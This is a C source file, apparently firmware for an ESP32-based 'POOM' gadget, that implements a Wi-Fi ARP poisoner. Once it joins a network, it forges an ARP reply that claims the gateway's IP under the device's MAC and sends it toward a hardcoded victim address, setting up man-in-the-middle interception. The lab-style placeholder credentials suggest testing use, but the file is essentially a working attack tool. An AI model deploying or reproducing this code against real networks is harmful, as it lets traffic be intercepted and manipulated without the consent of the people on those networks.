// SPDX-License-Identifier: MIT
// Copyright (c) 2026 THE POOM

#include "poom_wifi_arp_poisoner.h"

#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>

#include "bsp_pong.h"
#include "esp_wifi.h"
#include "lwip/inet.h"
#include "lwip/ip4_addr.h"
#include "poom_wifi_ctrl.h"
#include "ws2812.h"

#define POOM_WIFI_ARP_POISONER_MAC_LEN            (6)
#define POOM_WIFI_ARP_POISONER_IPV4_LEN           (4)
#define POOM_WIFI_ARP_POISONER_ETH_HEADER_LEN     (14)
#define POOM_WIFI_ARP_POISONER_ARP_HEADER_LEN     (28)
#define POOM_WIFI_ARP_POISONER_FRAME_LEN          (POOM_WIFI_ARP_POISONER_ETH_HEADER_LEN + POOM_WIFI_ARP_POISONER_ARP_HEADER_LEN)

#define POOM_WIFI_ARP_POISONER_ETH_TYPE_ARP       (0x0806)
#define POOM_WIFI_ARP_POISONER_ARP_HW_TYPE_ETH    (0x0001)
#define POOM_WIFI_ARP_POISONER_ARP_PROTO_IPV4     (0x0800)
#define POOM_WIFI_ARP_POISONER_ARP_OPCODE_REPLY   (0x0002)

#define POOM_WIFI_ARP_POISONER_WIFI_SSID          "SSID_LAB"
#define POOM_WIFI_ARP_POISONER_WIFI_PASSWORD      "PASSWORD_LAB"

#define POOM_WIFI_ARP_POISONER_VICTIM_IP_0        (192)
#define POOM_WIFI_ARP_POISONER_VICTIM_IP_1        (168)
#define POOM_WIFI_ARP_POISONER_VICTIM_IP_2        (1)
#define POOM_WIFI_ARP_POISONER_VICTIM_IP_3        (50)

static const char *POOM_WIFI_ARP_POISONER_TAG = "poom_wifi_arp_poisoner";

#if CONFIG_POOM_WIFI_ARP_POISONER_ENABLE_LOG

    #define POOM_PRINTF_E(fmt, ...) \
        printf("[E] [%s] %s:%d: " fmt "\n", POOM_WIFI_ARP_POISONER_TAG, __func__, __LINE__, ##__VA_ARGS__)

    #define POOM_PRINTF_W(fmt, ...) \
        printf("[W] [%s] %s:%d: " fmt "\n", POOM_WIFI_ARP_POISONER_TAG, __func__, __LINE__, ##__VA_ARGS__)

    #define POOM_PRINTF_I(fmt, ...) \
        printf("[I] [%s] %s:%d: " fmt "\n", POOM_WIFI_ARP_POISONER_TAG, __func__, __LINE__, ##__VA_ARGS__)

    #define POOM_PRINTF_D(fmt, ...) \
        printf("[D] [%s] %s:%d: " fmt "\n", POOM_WIFI_ARP_POISONER_TAG, __func__, __LINE__, ##__VA_ARGS__)

#else

    #define POOM_PRINTF_E(...)
    #define POOM_PRINTF_W(...)
    #define POOM_PRINTF_I(...)
    #define POOM_PRINTF_D(...)

#endif

typedef struct __attribute__((packed))
{
    uint16_t hw_type;
    uint16_t proto_type;
    uint8_t hw_len;
    uint8_t proto_len;
    uint16_t opcode;
    uint8_t sender_mac[POOM_WIFI_ARP_POISONER_MAC_LEN];
    uint8_t sender_ip[POOM_WIFI_ARP_POISONER_IPV4_LEN];
    uint8_t target_mac[POOM_WIFI_ARP_POISONER_MAC_LEN];
    uint8_t target_ip[POOM_WIFI_ARP_POISONER_IPV4_LEN];
} poom_wifi_arp_poisoner_arp_header_t;

static bool s_poom_wifi_arp_poisoner_initialized = false;
static bool s_poom_wifi_arp_poisoner_connected = false;
static bool s_poom_wifi_arp_poisoner_gateway_ready = false;
static esp_ip4_addr_t s_poom_wifi_arp_poisoner_gateway_ip = {0};
static ws2812_strip_t s_poom_wifi_arp_poisoner_led_strip;

/**
 * @brief Sends one ARP reply packet forged as gateway source.
 * @param[in,out] none Not used.
 * @return esp_err_t
 */
static esp_err_t poom_wifi_arp_poisoner_send_one_spoof_(void)
{
    uint8_t frame[POOM_WIFI_ARP_POISONER_FRAME_LEN];
    uint8_t source_mac[POOM_WIFI_ARP_POISONER_MAC_LEN];
    uint8_t gateway_ip[POOM_WIFI_ARP_POISONER_IPV4_LEN];
    uint8_t victim_ip[POOM_WIFI_ARP_POISONER_IPV4_LEN] = {
        POOM_WIFI_ARP_POISONER_VICTIM_IP_0,
        POOM_WIFI_ARP_POISONER_VICTIM_IP_1,
        POOM_WIFI_ARP_POISONER_VICTIM_IP_2,
        POOM_WIFI_ARP_POISONER_VICTIM_IP_3
    };
    uint8_t *ethernet_header;
    poom_wifi_arp_poisoner_arp_header_t *arp_header;
    esp_err_t status;

    if(!s_poom_wifi_arp_poisoner_gateway_ready)
    {
        POOM_PRINTF_W("Gateway IP is not available, skipping ARP spoof frame");
        return ESP_ERR_INVALID_STATE;
    }

    memset(frame, 0, sizeof(frame));

    status = esp_wifi_get_mac(WIFI_IF_STA, source_mac);
    if(status != ESP_OK)
    {
        POOM_PRINTF_E("esp_wifi_get_mac failed: %s", esp_err_to_name(status));
        return status;
    }

    ethernet_header = frame;
    memset(ethernet_header, 0xFF, POOM_WIFI_ARP_POISONER_MAC_LEN);
    memcpy(ethernet_header + POOM_WIFI_ARP_POISONER_MAC_LEN,
           source_mac,
           POOM_WIFI_ARP_POISONER_MAC_LEN);

    ethernet_header[12] = (uint8_t)((POOM_WIFI_ARP_POISONER_ETH_TYPE_ARP >> 8) & 0xFFU);
    ethernet_header[13] = (uint8_t)(POOM_WIFI_ARP_POISONER_ETH_TYPE_ARP & 0xFFU);

    arp_header = (poom_wifi_arp_poisoner_arp_header_t *)(frame + POOM_WIFI_ARP_POISONER_ETH_HEADER_LEN);
    arp_header->hw_type = htons(POOM_WIFI_ARP_POISONER_ARP_HW_TYPE_ETH);
    arp_header->proto_type = htons(POOM_WIFI_ARP_POISONER_ARP_PROTO_IPV4);
    arp_header->hw_len = POOM_WIFI_ARP_POISONER_MAC_LEN;
    arp_header->proto_len = POOM_WIFI_ARP_POISONER_IPV4_LEN;
    arp_header->opcode = htons(POOM_WIFI_ARP_POISONER_ARP_OPCODE_REPLY);

    gateway_ip[0] = ip4_addr1(&s_poom_wifi_arp_poisoner_gateway_ip);
    gateway_ip[1] = ip4_addr2(&s_poom_wifi_arp_poisoner_gateway_ip);
    gateway_ip[2] = ip4_addr3(&s_poom_wifi_arp_poisoner_gateway_ip);
    gateway_ip[3] = ip4_addr4(&s_poom_wifi_arp_poisoner_gateway_ip);

    memcpy(arp_header->sender_mac, source_mac, POOM_WIFI_ARP_POISONER_MAC_LEN);
    memcpy(arp_header->sender_ip, gateway_ip, POOM_WIFI_ARP_POISONER_IPV4_LEN);

    memset(arp_header->target_mac, 0x00, POOM_WIFI_ARP_POISONER_MAC_LEN);
    memcpy(arp_header->target_ip, victim_ip, POOM_WIFI_ARP_POISONER_IPV4_LEN);

    status = esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
    if(status != ESP_OK)
    {
        POOM_PRINTF_E("esp_wifi_80211_tx failed: %s", esp_err_to_name(status));
        return status;
    }

    POOM_PRINTF_I("Spoofed ARP reply transmitted");
    return ESP_OK;
}

/**
 * @brief Handles connected state actions after STA gets gateway information.
 * @param[in,out] none Not used.
 * @return void
 */
static void poom_wifi_arp_poisoner_on_wifi_connected_(void)
{
    int led_index;

    s_poom_wifi_arp_poisoner_connected = true;
    POOM_PRINTF_I("Wi-Fi connected, sending one ARP spoof frame");

    for(led_index = 0; led_index < s_poom_wifi_arp_poisoner_led_strip.led_count; led_index++)
    {
        ws2812_set_pixel(&s_poom_wifi_arp_poisoner_led_strip, led_index, 0, 0, 255, 0);
    }
    ws2812_show(&s_poom_wifi_arp_poisoner_led_strip);

    (void)poom_wifi_arp_poisoner_send_one_spoof_();
}

/**
 * @brief Handles disconnection state and requests STA reconnection.
 * @param[in,out] none Not used.
 * @return void
 */
static void poom_wifi_arp_poisoner_on_wifi_disconnected_(void)
{
    esp_err_t status;

    s_poom_wifi_arp_poisoner_connected = false;
    s_poom_wifi_arp_poisoner_gateway_ready = false;
    POOM_PRINTF_W("Wi-Fi disconnected, attempting reconnect");

    status = poom_wifi_ctrl_sta_connect(POOM_WIFI_ARP_POISONER_WIFI_SSID,
                                        POOM_WIFI_ARP_POISONER_WIFI_PASSWORD);
    if(status != ESP_OK)
    {
        POOM_PRINTF_W("Reconnect attempt failed: %s", esp_err_to_name(status));
    }
}

/**
 * @brief Processes Wi-Fi controller events for ARP poisoner runtime.
 * @param[in] info Wi-Fi event info payload.
 * @param[in,out] user_ctx User context pointer (unused).
 * @return void
 */
static void poom_wifi_arp_poisoner_wifi_evt_cb_(const poom_wifi_ctrl_evt_info_t *info, void *user_ctx)
{
    (void)user_ctx;

    if(info == NULL)
    {
        return;
    }

    if(info->evt == POOM_WIFI_CTRL_EVT_STA_GOT_IP)
    {
        s_poom_wifi_arp_poisoner_gateway_ip = info->gw;
        s_poom_wifi_arp_poisoner_gateway_ready = true;
        poom_wifi_arp_poisoner_on_wifi_connected_();
    }
    else if(info->evt == POOM_WIFI_CTRL_EVT_STA_DISCONNECTED)
    {
        poom_wifi_arp_poisoner_on_wifi_disconnected_();
    }
    else
    {
        POOM_PRINTF_D("Unhandled Wi-Fi event: %ld", (long)info->evt);
    }
}

/**
 * @brief Starts POOM Wi-Fi ARP poisoner runtime.
 * @param[in,out] none Not used.
 * @return esp_err_t
 */
esp_err_t poom_wifi_arp_poisoner_start(void)
{
    esp_err_t status;

    if(s_poom_wifi_arp_poisoner_initialized)
    {
        return ESP_OK;
    }

    ws2812_init(&s_poom_wifi_arp_poisoner_led_strip, PIN_NUM_WS2812, PIN_NUM_LEDS, false, 10U * 1000U * 1000U);
    ws2812_set_brightness(&s_poom_wifi_arp_poisoner_led_strip, 20);

    status = poom_wifi_ctrl_register_cb(poom_wifi_arp_poisoner_wifi_evt_cb_, NULL);
    if(status != ESP_OK)
    {
        POOM_PRINTF_E("poom_wifi_ctrl_register_cb failed: %s", esp_err_to_name(status));
        return status;
    }

    status = poom_wifi_ctrl_sta_connect(POOM_WIFI_ARP_POISONER_WIFI_SSID,
                                        POOM_WIFI_ARP_POISONER_WIFI_PASSWORD);
    if(status != ESP_OK)
    {
        POOM_PRINTF_E("poom_wifi_ctrl_sta_connect failed: %s", esp_err_to_name(status));
        (void)poom_wifi_ctrl_unregister_cb();
        return status;
    }

    s_poom_wifi_arp_poisoner_initialized = true;
    return ESP_OK;
}

/**
 * @brief Stops POOM Wi-Fi ARP poisoner runtime.
 * @param[in,out] none Not used.
 * @return esp_err_t
 */
esp_err_t poom_wifi_arp_poisoner_stop(void)
{
    esp_err_t status = poom_wifi_ctrl_unregister_cb();

    (void)poom_wifi_ctrl_sta_disconnect();

    s_poom_wifi_arp_poisoner_initialized = false;
    s_poom_wifi_arp_poisoner_connected = false;
    s_poom_wifi_arp_poisoner_gateway_ready = false;
    memset(&s_poom_wifi_arp_poisoner_gateway_ip, 0, sizeof(s_poom_wifi_arp_poisoner_gateway_ip));

    return status;
}

/**
 * @brief Reports whether ARP poisoner runtime was initialized.
 * @param[in,out] none Not used.
 * @return bool
 */
bool poom_wifi_arp_poisoner_is_initialized(void)
{
    return s_poom_wifi_arp_poisoner_initialized;
}
